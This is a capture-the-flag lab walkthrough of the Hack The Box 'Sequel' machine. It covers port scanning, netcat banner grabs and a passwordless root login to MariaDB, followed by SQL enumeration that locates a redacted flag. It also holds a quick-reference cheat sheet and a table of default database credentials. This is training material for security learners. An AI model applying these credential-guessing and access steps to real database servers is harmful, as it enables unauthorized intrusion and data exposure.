# HTB Starting Point: Sequel (MySQL/MariaDB)

<div align="center">
  
| **Machine Info** | |
|------------------|-|
| **Name** | Sequel |
| **Difficulty** | Starting Point (Tier 1) |
| **Service** | MySQL / MariaDB |
| **Port** | 3306 |
| **Date Completed** | 2026-03-25 |

</div>

---

## 📋 Table of Contents
1. [Reconnaissance](#-reconnaissance)
2. [Service Enumeration](#-service-enumeration)
3. [Database Access](#-database-access)
4. [Flag Discovery](#-flag-discovery)
5. [Questions & Answers](#-questions--answers)
6. [Quick Reference](#-quick-reference)
7. [Lessons Learned](#-lessons-learned)

---

## 💻 Environment Setup

To ensure reproducibility and consistent results, the following environment was used for this engagement:

| **Component** | **Specification** |
| :--- | :--- |
| **Attack Machine** | Kali Linux (2024.x) / Parrot Security OS |
| **Hypervisor** | VMware Workstation / Oracle VirtualBox |
| **Connectivity** | OpenVPN (HTB Lab Configuration) |
| **Tools Used** | Nmap, MySQL-Client, Netcat (nc) |

> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.

---

## 🔍 Reconnaissance

### Port Scan
```bash
# Fast port scan to discover open ports
nmap -p- --min-rate 1000 10.129.95.232
```

**Results:**
```
PORT     STATE SERVICE
3306/tcp open  mysql
```

Only port **3306 (MySQL)** is open, indicating a database server.

---

## 🛠️ Service Enumeration

### Version Detection with Nmap
```bash
# Service version detection
nmap -p 3306 -sV 10.129.95.232
```

### Manual Banner Grab (When Nmap Fails)
```bash
# Send MySQL protocol handshake to trigger version banner
(echo -e "\x00\x00\x00\x01"; sleep 1) | nc -nv 10.129.95.232 3306 | strings | grep -i "mysql\|mariadb"
```

**Output:**
```
5.5.5-10.3.27-MariaDB-0+deb10u1
mysql_native_password
```

**Interpretation:**
| Field | Value |
|-------|-------|
| **Database** | MariaDB 10.3.27 |
| **OS** | Debian 10 (buster) |
| **Auth Method** | mysql_native_password |

---

## 🔑 Database Access

### Initial Connection Attempt (SSL Error)
```bash
mysql -h 10.129.95.232 -u root
```

**Error:**
```
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

### Fix: Disable SSL
```bash
# Connect with SSL disabled
mysql -h 10.129.95.232 -u root --ssl=0

# Faster connection with auto-rehash disabled
mysql -h 10.129.95.232 -u root --ssl=0 -A
```

**✅ Success!** Connected as `root` with blank password (default credentials).

---

## 🗄️ Flag Discovery

### Step 1: List All Databases
```sql
SHOW DATABASES;
```

**Output:**
```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

### Step 2: Select Target Database
```sql
USE htb;
```

### Step 3: List Tables
```sql
SHOW TABLES;
```

**Output:**
```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

### Step 4: Explore Tables
```sql
-- Check users table
SELECT * FROM users;
```

**Output:**
```
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
```

```sql
-- Check config table (flag location)
SELECT * FROM config;
```

**Output:**
```
+----+------+--------------------------+
| id | name | value                    |
+----+------+--------------------------+
|  1 | flag | HTB{REDACTED}   |
+----+------+--------------------------+
```

### 🎯 Flag Found!
```
HTB{REDACTED}
```

---

## 📝 Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | When using the MySQL command line client, what switch do we need to use in order to specify a login username? | `-u` |
| 2 | Which username allows us to log into this MariaDB instance without providing a password? | `root` |
| 3 | In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? | `*` (asterisk) |
| 4 | What is the name of the fourth database that's unique to this host? | `htb` |

---

## ⚡ Quick Reference

### MySQL Connection Commands
```bash
# Standard connection
mysql -h <IP> -u root --ssl=0

# Fast connection (no auto-rehash)
mysql -h <IP> -u root --ssl=0 -A

# With password prompt
mysql -h <IP> -u root -p --ssl=0
```

### Essential SQL Commands
```sql
-- Database exploration
SHOW DATABASES;
USE database_name;
SHOW TABLES;

-- Data retrieval
SELECT * FROM table_name;
DESCRIBE table_name;

-- System information
SELECT VERSION();
SELECT CURRENT_USER();
SELECT user, host FROM mysql.user;
```

### Banner Grab Commands
```bash
# MySQL / MariaDB
(echo -e "\x00\x00\x00\x01"; sleep 1) | nc -nv <IP> 3306 | strings | grep -i "mysql\|mariadb"

# Redis
echo -e "*1\r\n\$4\r\nINFO\r\n" | nc -nv <IP> 6379 | strings | grep redis_version

# Web Server
curl -I http://<IP>
```

---

## 🐛 Troubleshooting: SSL Errors

| Error | Solution |
|-------|----------|
| `TLS/SSL error: SSL is required` | Add `--ssl=0` or `--skip-ssl` |
| `unknown variable 'ssl-mode=DISABLED'` | Use `--ssl=0` (older MySQL versions) |
| `Can't connect to MySQL server` | Verify VPN connection and IP address |

---

## 📚 Default Credentials Reference

| Username | Password | Success Rate |
|----------|----------|--------------|
| `root` | (blank) | ⭐⭐⭐⭐⭐ (HTB Starting Point) |
| `root` | `root` | ⭐⭐ |
| `admin` | (blank) | ⭐ |
| `root` | `toor` | ⭐ |

---

## 💡 Lessons Learned

| # | Lesson |
|---|--------|
| 1 | **Nmap isn't always enough** — Use service-specific banner grabs for version enumeration |
| 2 | **MySQL requires a protocol handshake** — Send `\x00\x00\x00\x01` to trigger version banner |
| 3 | **SSL errors are common** — Use `--ssl=0` to disable SSL on older MySQL versions |
| 4 | **Default credentials work** — Always try `root:blank` first on HTB Starting Point |
| 5 | **`*` is your friend** — Use `SELECT * FROM table` to explore unknown table structures |

---

## 🔗 Resources

- [MySQL Official Documentation](https://dev.mysql.com/doc/)
- [MariaDB Knowledge Base](https://mariadb.com/kb/en/documentation/)
- [HTB Academy: SQL Fundamentals](https://academy.hackthebox.com/course/preview/sql-fundamentals)
- [Nmap MySQL Scripts](https://nmap.org/nsedoc/categories/mysql.html)

---

## 🏷️ Tags

`#htb` `#starting-point` `#sequel` `#mysql` `#mariadb` `#sql` `#database` `#enumeration` `#banner-grabbing`

---

<div align="center">
  
**Machine Completed** ✅

*Last Updated: March 25, 2026*

</div>
